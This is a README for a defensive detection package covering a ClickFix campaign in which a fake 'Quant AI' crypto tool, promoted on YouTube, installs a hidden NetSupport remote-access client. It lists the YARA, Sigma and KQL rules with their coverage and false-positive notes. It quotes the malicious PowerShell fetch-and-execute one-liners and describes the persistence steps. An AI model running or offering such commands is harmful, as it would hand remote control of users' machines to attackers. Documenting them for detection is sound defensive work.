# quantai-fake-youtube-netsupport-rat

Blog post: https://blueteam.cool/posts/quantai-fake-youtube-netsupport-rat/

## Summary

A verified YouTube channel promotes a fake crypto market-analysis product, "Quant AI", in two
review videos that link to `quantai[.]io`. After signup, the site's "Install Quant" page instructs
the user to press Win+R, open PowerShell and paste `irm quantai[.]io/install | iex` (ClickFix).

That command returns a one-line second hop to `chartsgpt[.]com`, which serves a plain PowerShell
dropper. The dropper downloads password-protected 7z archives and a renamed binary that reports as the 7-Zip console,
unpacks a genuine vendor-signed NetSupport Manager client into `%LOCALAPPDATA%\Supports`, starts
it, locks the folder with `icacls`, and extracts a shortcut into the Startup folder. It then
downloads and launches a signed decoy app that shows a crypto dashboard.

The NetSupport client is configured to run hidden and connect to a gateway at
`sonosarcsounds[.]com:2084`, with `sonosarcsounds[.]net:2084` as secondary. A second, simpler dropper on
the same host (`ps.php`, `ps2.php`) installs the identical NetSupport files into
`%LOCALAPPDATA%\Stoservice` without the `icacls` step or the decoy.

```
YouTube video -> quantai[.]io (signup) -> "Install Quant" page
  -> irm quantai[.]io/install | iex
    -> irm chartsgpt[.]com/quant.php?Dio=<hostname> | iex
      -> supportn.7z + icos.7z + vh.exe (7-Zip)
        -> %LOCALAPPDATA%\Supports\service.exe (NetSupport client32.exe)
           -> sonosarcsounds[.]com:2084 / sonosarcsounds[.]net:2084
        -> icacls deny + Owner Rights grant on the folder
        -> Startup\service.lnk
      -> %LOCALAPPDATA%\Quant\Quant.exe (decoy) + Desktop\Quant.lnk
```

## What is included

| File | Description |
|------|-------------|
| `iocs.csv` | Network, file, path, string and YouTube indicators (network values defanged) |
| `rule.yar` | Five YARA rules: first-hop one-liner, dropper, NetSupport config, NetSupport licence, decoy app |
| `sigma-icacls-deny-owner-rights-localappdata.yml` | icacls deny / Owner Rights grant on a LocalAppData folder |
| `sigma-netsupport-client-user-profile.yml` | NetSupport `client32.exe` running from a user profile under any name |
| `kql.md` | Seven hunt queries for Microsoft Sentinel / Defender XDR |

## Coverage notes

### What these detections cover

- The two droppers as retrieved on 2026-11-10, by content and by behaviour. Earlier builds may have differed: the
  July Startup shortcut records a different, smaller target than the client served now.
- The NetSupport configuration, both by this gateway and by its hidden-mode flag combination.
- The folder-locking `icacls` pattern and the NetSupport client running outside Program Files,
  neither of which depends on this campaign's domains.

### What they do NOT cover

- Anything the operator does once connected. NetSupport is an interactive remote-control tool
  and no post-connection activity was observed.
- The YouTube and lure-site layer. Those are in `iocs.csv` for blocking and reporting only.
- The second dropper omits the `icacls` step, so the icacls rule will not fire for it.
- The dropper runs icacls twice as separate processes: one `/deny` for the user, one `/grant` for `*S-1-3-4`.
  No single command line contains both.
- A ClickFix paste typed into an already open PowerShell window leaves no command line. Use
  script block logging (Event ID 4104) for that case.

## False-positive notes

- `rule.yar` `NetSupport_RAT_Config_sonosarcsounds`: the flag-only branch (gateway address plus four hidden-mode flags)
  can match a legitimate NetSupport deployment configured for silent operation. Check the gateway.
- `rule.yar` `QuantAI_Decoy_WebView2_Shell`: the signer-name branch will match any other software
  signed by the same certificate subject.
- `sigma-netsupport-client-user-profile.yml`: portable or unmanaged NetSupport installs.
- `sigma-icacls-deny-owner-rights-localappdata.yml`: rare; some installers adjust ACLs under
  LocalAppData.
- The NetSupport binaries in this chain are genuine vendor-signed files, and `vh.exe` reports as the 7-Zip console.
  Their hashes are listed with low confidence for scoping only.

## Confidence

High for the delivery chain and configuration: every stage was retrieved and read statically.
Nothing was executed, and no victim telemetry informs these rules, so the Sigma and KQL content
is derived from the dropper code and has not been validated against live events. The first-hop, dropper and decoy YARA rules were tested against the retrieved samples during analysis. The config rule's
condition was simplified afterwards and the licence rule was added afterwards; neither has been re-run. Test before deploying.

## Related detections

- [iocs.csv](iocs.csv)
- [rule.yar](rule.yar)
- [sigma-icacls-deny-owner-rights-localappdata.yml](sigma-icacls-deny-owner-rights-localappdata.yml)
- [sigma-netsupport-client-user-profile.yml](sigma-netsupport-client-user-profile.yml)
- [kql.md](kql.md)
